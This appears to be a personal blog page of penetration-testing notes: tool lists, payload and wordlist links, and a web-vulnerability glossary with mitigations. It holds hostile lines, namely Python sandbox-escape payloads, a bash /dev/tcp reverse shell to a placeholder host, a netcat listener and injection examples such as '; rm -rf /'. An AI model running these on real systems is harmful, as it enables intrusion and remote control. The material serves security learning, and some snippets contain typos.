---
title: "Penetration Testing Tools and Methodology"
date: 2026-05-01T21:44:47+03:00
draft: false
description: "Personal notes on penetration testing tools, methodologies, and practical experience. Covers essential security assessment tools, their applications, and workflow insights."
summary: "A curated collection of penetration testing tools and approaches based on hands‑on experience, focusing on network scanning, web application testing, mobile analysis, and reverse engineering."
---

{{< toc >}}

## Tools

### Distributions

- **Kali Linux (Image)** – Debian‑based distribution pre‑loaded with hundreds of security tools for penetration testing, forensics, and reverse engineering.
- **Parrot Linux (Image)** – Security‑oriented distribution similar to Kali, with additional privacy and anonymity features.

### Network Scanning & Reconnaissance

- **Nmap** – Network mapper for host discovery, port scanning, version detection, and OS fingerprinting. Essential for initial reconnaissance.
- **ncat** – Ncat (short for netcat) is a powerful and flexible command-line networking utility developed as part of the Nmap Project.
- **socat** – Multipurpose relay tool for bidirectional data transfer between two independent data channels (files, pipes, sockets, SSL, etc.). Useful for port forwarding, proxying, and creating network connections.

### Web Application Testing

- **Burp Suite** – Integrated platform for web vulnerability scanning, intercepting proxies, and manual testing of web applications.
- **ZAProxy** – Open‑source web application security scanner (OWASP ZAP) for automated finding of vulnerabilities and manual exploration.
- **mitmproxy** – Interactive TLS‑capable intercepting HTTP proxy for debugging, testing, and security assessments.
- **jwt_tool** – Command line tool for decoding, signing, and verifying JSON Web Tokens (JWTs).
- **sqlmap** – Command line tool for extracting data from SQL databases.
- **NoSQLMap** – Command line tool for automating SQL injection attacks on NoSQL databases.

### Mobile Application Testing

- **apk-mitm** – Tool for preparing Android APK files for HTTPS inspection by bypassing certificate pinning.

### Reverse Engineering & Forensics

- **Ghidra** – Software reverse engineering framework developed by NSA, supporting disassembly, decompilation, and scripting.
- **binwalk** – Firmware analysis tool for extracting embedded files and executable code from binary images.
- **gdb** – GNU debugger for analyzing binaries, inspecting memory, disassembling code, and debugging crashes or core dumps.
- **objdamp** – Display information from object files.

### System & Kernel Tracing

- **bpftrace** – Dynamic tracing tool for Linux using eBPF; useful for kernel-level performance analysis and security monitoring (tracing syscalls, file operations, network events in real time).
- **strace** – Linux system call tracer for debugging and monitoring system calls and signals. Helps analyze how binaries interact with the OS (file operations, network calls, process execution).

### Password & Hash Analysis

- **hashcat** – Command line tool for cracking hashes.

## Cheats sheets

- **Internal All The Things** - [Link](https://swisskyrepo.github.io/InternalAllTheThings/)
- **GTFOBin** - [Link](https://gtfobins.org/)

## Wordlists

- **SecLists** - [Link](https://github.com/danielmiessler/SecLists)
- **rockyou** - [Link](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- **Kali Linux wordlists** - [Link](https://gitlab.com/kalilinux/packages/wordlists)
- **api-endpoints-bruteforce** - [Link](https://github.com/aleksey0xffd/api-endpoints-bruteforce)

## Payloads

- **PayloadsAllTheThings** - [Link](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **NoSQL injection** - [Link](https://portswigger.net/web-security/nosql-injection), [Link](https://denizhalil.com/2025/12/23/nosql-injection-attacks-mongodb-couchdb/)
-  **HackTricks** - [Link](https://hacktricks.wiki/en/generic-methodologies-and-resources/)

### Code injection

Python sandbox escape

```python
(b := [x for x in <object>.__class__.__base__.__subclasses__() if x.__name__ == '<class>'][0]()._module.__builtins__) and b['int'](b['str'](b['__import__']('subprocess').run(\"python -c \\\"<code>\\\"\", capture_output=True, text=True, shell=True)))

self.__init__.__globals__.__builtins__.__import__('os').popen('<command>').read()

<object>.__class____base__.__init__.__globals__.__builtins__['__import__']('os').popen('<command>').read()

```

## Web Vulnerabilities

- **IDOR (Insecure Direct Object Reference)**
    - Occurs when an application exposes direct references to internal objects (e.g., database IDs) without proper access control
    - Example: `/api/users/123` — modifying `123` to access another user's data
    - Mitigation: enforce authorization checks for every object access, use indirect references (UUIDs)

- **Path Traversal**
    - Attacker manipulates file paths to access files and directories outside the web root
    - Example: `../../../etc/passwd`
    - Mitigation: normalize and validate paths, use allowlists, avoid passing user input directly to filesystem APIs

- **CSRF (Cross-Site Request Forgery)**
    - An attacker tricks an authenticated user into executing unwanted actions on a web application
    - Mitigation: CSRF tokens, SameSite cookies (Strict/Lax), validate Origin/Referer headers

- **SSRF (Server-Side Request Forgery)**
    - A server-side application fetches a URL supplied by the attacker, targeting internal resources
    - Example: `?url=http://169.254.169.254/` (cloud metadata endpoint)
    - **Blind SSRF** — no direct response; requires out-of-band detection via DNS/HTTP callbacks
    - **SVG Upload** — using SVG files with external entity references to trigger server-side requests
    - **XInclude** — XML Inclusions to include external resources during server-side XML processing
    - Mitigation: allowlist of permitted URLs/domains, block private IP ranges, implement egress network policies

- **SSTI (Server-Side Template Injection)**
    - Injecting template directives into server-side templates (Jinja2, Twig, Freemarker, Velocity, Pug) leading to remote code execution or data exposure
    - Example: `{{7*7}}` evaluates to `49` in Jinja2/Twig if unsanitized input reaches the template engine
    - **Detection** — submit template syntax (`{{7*7}}`, `${7*7}`, `#{7*7}`) and look for computed results in the response
    - **Exploitation** — access template engine built-ins (e.g., Jinja2 `__class__.__mro__` chain, Twig `_self.env.registerUndefinedFilterCallback`)
    - Mitigation: never allow user input in template strings, use sandboxed template environments, separate logic from presentation

- **XXE (XML External Entity Injection)**
    - Attack exploiting XML parsers that process external entities, leading to file disclosure, SSRF, or DoS
    - **DTD (Document Type Definition)** — defines XML structure and can reference external resources
    - **dtd-locker** — technique to lock a malicious DTD for out-of-band data exfiltration
    - **In-Band** — extracted data returned directly in the server response
    - **Error-Based** — data extraction through verbose XML parsing error messages
    - **Out-of-Band (OOB)** — exfiltration via external channels (DNS, HTTP); requires an OOB collector
    - Mitigation: disable external entity processing in XML parsers, use less complex data formats (JSON)

- **XSS (Cross-Site Scripting)**
    - Injecting malicious scripts into web pages viewed by other users; three main types based on where the payload is injected and how it executes
    - **Reflected XSS** — malicious script is reflected off the web server in the immediate response (e.g., in search results or error messages); requires user interaction (clicking a crafted link)
    - **Stored XSS** — malicious script is permanently stored on the server (database, comments, forum posts) and served to every user who views the affected page; no direct interaction required
    - **DOM-based XSS** — vulnerability exists entirely in client-side JavaScript; the page itself does not change, but the DOM environment is modified by the attacker's payload
    - Mitigation: context-aware output encoding (HTML entity, JavaScript, CSS, URL encoding), Content Security Policy (CSP), input sanitization, use safe DOM APIs (.textContent instead of .innerHTML)

- **NGINX Misconfiguration**
    - **Off-by-slash** — path traversal caused by missing trailing slash in `alias` directive
    - **Alias Traversal** — directory traversal via misconfigured `alias` block (e.g., `/static` → `/static../`)
    - Mitigation: always add trailing slashes consistently, avoid `alias` inside regex locations, prefer `root`

- **CORS Misconfiguration**
    - Overly permissive `Access-Control-Allow-Origin` (e.g., reflecting arbitrary origins or using `*` with credentials)
    - Allows attackers to read sensitive cross-origin responses on behalf of authenticated users
    - Mitigation: restrict `Access-Control-Allow-Origin` to a specific allowlist, avoid reflecting `Origin` header

- **Code Injection**
    - Injecting and executing arbitrary code through input passed to language runtime functions that evaluate strings as code (eval, exec, unserialize, pickle.loads, reflect.loadModule)
    - Example: `eval("os.system('id')")` or PHP `unserialize()` gadget chains for RCE
    - **Python Sandbox Escape** — bypass restricted Python environments using class introspection (`__class__.__mro__`, `__subclasses__()`, `__globals__`) to access builtins and spawn shells (see [Python sandbox payloads](#code-injection) below)
    - Mitigation: avoid dynamic code execution with user-controlled input, sandbox with strict allowlists, use safe parsers (ast.literal_eval instead of eval)

- **Open Redirect**
    - An application accepts a user-controlled URL and redirects without validation
    - Example: `/redirect?url=https://evil.com`
    - Mitigation: allowlist of permitted redirect destinations, use relative paths, avoid passing raw URLs from user input

- **OS Command Injection**
    - Injecting arbitrary operating system commands through unsanitized input passed to shell execution functions (system, exec, popen, subprocess.run with shell=True)
    - Example: `; rm -rf /` or `127.0.0.1; whoami` in a ping input field
    - **In-Band** — command output returned directly in the HTTP response
    - **Blind** — no visible output; use out-of-band detection (DNS/HTTP callbacks to a controlled server) or time-based inference (sleep, ping)
    - **Command Chaining** — `;` (sequential), `&&` (conditional on success), `||` (conditional on failure), `|` (pipe), backticks, `$()`
    - Mitigation: avoid shell execution functions with user input, use safe APIs (execFile/spawn with array arguments), strict input validation and allowlisting

- **SQL Injection**
    - Injecting malicious SQL queries through user input to read, modify, or delete database data
    - **In-Band** — attacker receives results directly in the application response
    - **In-Band Union** — using UNION operator to append attacker-controlled result sets
    - **Error-Based** — extracting data through verbose database error messages
    - **Blind** — no visible output; inferring data via Boolean-based or Time-based (SLEEP) conditions
    - **Out-of-Band** — exfiltrating data through external channels (DNS, HTTP) when direct output is unavailable
    - Mitigation: parameterized queries (prepared statements), input validation, least-privilege DB accounts

- **NoSQL Injection**
    - Injecting operators (`$ne`, `$gt`, `$regex`) or breaking query syntax in NoSQL databases (e.g., MongoDB)
    - Example: `?username[$ne]=` — authentication bypass
    - Mitigation: sanitize and type-check input, avoid raw query construction, use ORM query builders

- **Vulnerable Dependency & Supply Chain**
    - Using third-party libraries or components with known vulnerabilities (CVEs)
    - **Supply Chain Attacks** — compromising dependencies during development or build pipeline (e.g., dependency confusion, typosquatting)
    - Mitigation: SBOM (Software Bill of Materials), automated dependency scanning (Snyk, Dependabot), regular updates, vendor verification

- **Crypto Failures**
    - Weak encryption algorithms (DES, RC4), hardcoded keys, improper key management, missing encryption in transit
    - **JWT HS256** — using a symmetric HMAC algorithm (HS256) with an asymmetric RSA public key as the secret; the attacker can forge tokens since the public key is often obtainable
    - **JWT `none` algorithm** — JWTs with `"alg": "none"` bypass signature verification; the server accepts unsigned tokens if the implementation does not enforce a signature algorithm allowlist
    - Mitigation: use modern algorithms (AES-256, ChaCha20), proper key rotation, enforce TLS 1.2+ for all data in transit; for JWTs: use asymmetric algorithms (RS256/ES256), validate `alg` header against an allowlist, reject `none` algorithm

## Commands


String in hexadecimal format for URL

```bash
echo -n "<text>" | xxd -p | sed 's/../%&/g'
```

String in URL format

```bash
python3 -c "from urllib.parse import quote; print(quote(\"<text>\"))"
```

Listen on port

```bash
netcat/nc/ncat -lvnkp <port>
```

Reverce shell

```bash
bash -i >& /dev/tcp/<host>/<ip> 0>&1
bash -c 'bash -i >& /dev/tcp/<host>/<ip> 0>&1'
```

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
